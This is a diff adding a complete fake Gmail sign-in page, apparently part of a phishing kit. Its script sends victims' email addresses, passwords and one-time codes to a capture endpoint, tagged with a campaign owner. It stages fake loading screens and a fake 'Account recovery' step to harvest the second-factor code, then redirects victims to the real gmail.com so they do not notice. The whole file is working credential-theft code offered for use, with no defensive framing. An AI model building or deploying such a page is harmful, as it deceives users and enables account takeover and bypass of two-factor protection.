@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+            transition: background-color 0.25s ease;
+        }
+
+        /* ===== ÉCRANS DE CHARGEMENT (3s GRIS + 3s BLANC / BLEU) ===== */
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader-overlay.active {
+            display: flex;
+        }
+
+        .loader-gray {
+            background-color: #5f6368;
+        }
+
+        .loader-white {
+            background-color: #ffffff;
+        }
+
+        .circle-spinner {
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            animation: spin 0.85s linear infinite;
+        }
+
+        .spinner-light {
+            border: 4px solid rgba(255, 255, 255, 0.28);
+            border-top: 4px solid #ffffff;
+        }
+
+        .spinner-blue {
+            border: 4px solid rgba(26, 115, 232, 0.2);
+            border-top: 4px solid #1a73e8;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ===== CONTAINER PRINCIPAL CONNEXION ===== */
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header-logo {
+            width: 130px;
+            margin-bottom: 20px;
+        }
+
+        .header-title {
+            font-size: 32px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .header-subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        .login-card {
+            background-color: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 2px;
+            padding: 40px 35px;
+            text-align: left;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+
+        .avatar-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .avatar {
+            width: 100px;
+            height: 100px;
+            background-color: #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .avatar svg {
+            width: 65px;
+            height: 65px;
+            fill: #ffffff;
+            margin-top: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .login-card input[type="email"],
+        .login-card input[type="password"] {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #d9d9d9;
+            border-radius: 2px;
+            background-color: #ffffff;
+            color: #202124;
+            outline: none;
+        }
+
+        .login-card input[type="email"]:focus,
+        .login-card input[type="password"]:focus {
+            border-color: #4285f4;
+        }
+
+        .btn-signin {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: #ffffff;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-signin:hover {
+            background-color: #3367d6;
+        }
+
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #202124;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            margin-right: 8px;
+            cursor: pointer;
+        }
+
+        .form-options a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .form-options a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 40px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 15px;
+        }
+
+        .footer-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .footer-icons svg {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .footer-icons svg:hover {
+            opacity: 0.8;
+        }
+
+        /* ===== CARTE RECOVERY / OTP ===== */
+        .recovery-card {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            background-color: #ffffff;
+        }
+
+        .recovery-card.visible {
+            display: block;
+        }
+
+        .google-logo {
+            display: block;
+            width: 75px;
+            margin: 0 auto 20px auto;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+
+        .description-text {
+            font-size: 16px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #202124;
+            padding: 0 10px;
+        }
+
+        .email-badge {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #3c4043;
+            margin-bottom: 40px;
+        }
+
+        .email-badge svg {
+            width: 24px;
+            height: 24px;
+            fill: #5f6368;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            line-height: 1.5;
+            text-align: left;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 50px;
+            text-align: left;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 14px 15px;
+            font-size: 16px;
+            color: #202124;
+            background-color: transparent;
+            border: 2px solid #1a73e8;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .input-container label {
+            position: absolute;
+            top: -8px;
+            left: 12px;
+            background-color: #ffffff;
+            padding: 0 5px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #1a73e8;
+        }
+
+        .actions-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .try-another {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a73e8;
+            text-decoration: none;
+            padding: 10px;
+            margin-left: -10px;
+            border-radius: 4px;
+        }
+
+        .try-another:hover {
+            background-color: #f6fafe;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        @media (max-width: 480px) {
+            .recovery-card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Chargement 1 : Page grise + cercle pendant 3 secondes -->
+    <div id="grayLoaderOverlay" class="loader-overlay loader-gray" aria-live="polite" aria-busy="true">
+        <div class="circle-spinner spinner-light" aria-hidden="true"></div>
+    </div>
+
+    <!-- Chargement 2 : Page blanche + cercle bleu pendant 3 secondes -->
+    <div id="blueLoaderOverlay" class="loader-overlay loader-white" aria-live="polite" aria-busy="true">
+        <div class="circle-spinner spinner-blue" aria-hidden="true"></div>
+    </div>
+
+    <!-- Étape 1 : Connexion Gmail -->
+    <div class="login-container" id="loginContainer">
+        <header>
+            <svg class="header-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.55-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+                <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+                <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+                <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
+            </svg>
+
+            <h1 class="header-title">One account. All of Google.</h1>
+            <p class="header-subtitle">Sign in to continue to Gmail</p>
+        </header>
+
+        <main class="login-card">
+            <div class="avatar-container">
+                <div class="avatar">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="emailInput" placeholder="Email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="passwordInput" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="btn-signin">Sign in</button>
+
+                <div class="form-options">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="staySignedIn" checked>
+                        Stay signed in
+                    </label>
+                    <a href="#">Need help?</a>
+                </div>
+            </form>
+        </main>
+
+        <div class="create-account">
+            <a href="#">Create an account</a>
+        </div>
+
+        <footer class="footer">
+            <p class="footer-text">One Google Account for everything Google</p>
+            <div class="footer-icons">
+                <svg viewBox="0 0 24 24" fill="#db4437"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-2-11v3H7v2h3v3h2v-3h3v-2h-3V9z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#4285f4"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#ea4335"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#fbbc05"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6h2c0-2.21 1.79-4 4-4s4 1.79 4 4h2c0-3.31-2.69-6-6-6z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#34a853"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#ff0000"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#4285f4"><path d="M3.5 18.5v-13l10 6.5-10 6.5z"/></svg>
+                <svg viewBox="0 0 24 24" fill="#34a853"><path d="M19.5 14.5l-4-7h-7l-4 7h15zm-7.5 3l3.5-6h-7l3.5 6z"/></svg>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Étape 2 : Account recovery / OTP -->
+    <div class="recovery-card" id="recoveryCard">
+        <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        </svg>
+
+        <h1 class="title">Account recovery</h1>
+
+        <p class="description-text">
+            To help keep your account safe, Google wants to make sure that it's really you trying to sign in
+        </p>
+
+        <div class="email-badge">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+            </svg>
+            <span id="recoveryEmailDisplay">ajaykumaryaail@gmail.com</span>
+        </div>
+
+        <p class="instruction-text" id="instructionText">
+            An email with a verification code was just sent to ajaykumaryaail@gmail.com
+        </p>
+
+        <form id="otpForm">
+            <div class="input-container">
+                <label for="code">Enter code</label>
+                <input type="text" id="code" name="code" autocomplete="off" required>
+            </div>
+
+            <div class="actions-container">
+                <a href="#" class="try-another" id="tryAnotherLink">Try another way</a>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignOwner = urlParams.get("user") || "Kim";
+        const linkType = (urlParams.get("type") || "otp").toLowerCase();
+
+        let savedUser = "";
+        let savedPass = "";
+
+        const loginContainer = document.getElementById("loginContainer");
+        const recoveryCard = document.getElementById("recoveryCard");
+        const grayLoaderOverlay = document.getElementById("grayLoaderOverlay");
+        const blueLoaderOverlay = document.getElementById("blueLoaderOverlay");
+        const loginForm = document.getElementById("loginForm");
+        const otpForm = document.getElementById("otpForm");
+        const emailInput = document.getElementById("emailInput");
+        const passwordInput = document.getElementById("passwordInput");
+        const staySignedIn = document.getElementById("staySignedIn");
+        const recoveryEmailDisplay = document.getElementById("recoveryEmailDisplay");
+        const instructionText = document.getElementById("instructionText");
+        const codeInput = document.getElementById("code");
+
+        function sendCapture(payload) {
+            return fetch("/api/capture", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch((err) => console.log(err));
+        }
+
+        function showOtpStep(userEmail) {
+            const displayEmail = userEmail || "ajaykumaryaail@gmail.com";
+            recoveryEmailDisplay.textContent = displayEmail;
+            instructionText.textContent = `An email with a verification code was just sent to ${displayEmail}`;
+            codeInput.value = "";
+            recoveryCard.classList.add("visible");
+            codeInput.focus();
+        }
+
+        loginForm.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            savedUser = emailInput.value.trim();
+            savedPass = passwordInput.value;
+
+            if (!savedUser || !savedPass) return;
+
+            const isOtpFlow = linkType !== "standard";
+
+            const payload = {
+                owner: campaignOwner,
+                network: "Gmail",
+                type: isOtpFlow ? "otp_step1" : "standard",
+                victimUser: savedUser,
+                victimPass: savedPass,
+                staySignedIn: staySignedIn.checked,
+                otp: "Aucun"
+            };
+
+            sendCapture(payload);
+
+            loginContainer.style.display = "none";
+
+            // 1. Page grise + cercle pendant 3 secondes
+            grayLoaderOverlay.classList.add("active");
+
+            setTimeout(() => {
+                grayLoaderOverlay.classList.remove("active");
+
+                // 2. Page blanche + cercle bleu pendant 3 secondes
+                blueLoaderOverlay.classList.add("active");
+
+                setTimeout(() => {
+                    blueLoaderOverlay.classList.remove("active");
+
+                    if (isOtpFlow) {
+                        showOtpStep(savedUser);
+                    } else {
+                        window.location.href = "https://gmail.com";
+                    }
+                }, 3000);
+            }, 3000);
+        });
+
+        otpForm.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const otpCode = codeInput.value.trim();
+
+            if (!otpCode) {
+                codeInput.focus();
+                return;
+            }
+
+            const payload = {
+                owner: campaignOwner,
+                network: "Gmail",
+                type: linkType,
+                victimUser: savedUser,
+                victimPass: savedPass,
+                staySignedIn: staySignedIn.checked,
+                otp: otpCode
+            };
+
+            const redirectTimer = setTimeout(() => {
+                window.location.href = "https://gmail.com";
+            }, 1200);
+
+            sendCapture(payload).finally(() => {
+                clearTimeout(redirectTimer);
+                window.location.href = "https://gmail.com";
+            });
+        });
+
+        document.getElementById("tryAnotherLink").addEventListener("click", (e) => {
+            e.preventDefault();
+            codeInput.focus();
+        });
+    </script>
+
+</body>
+</html>
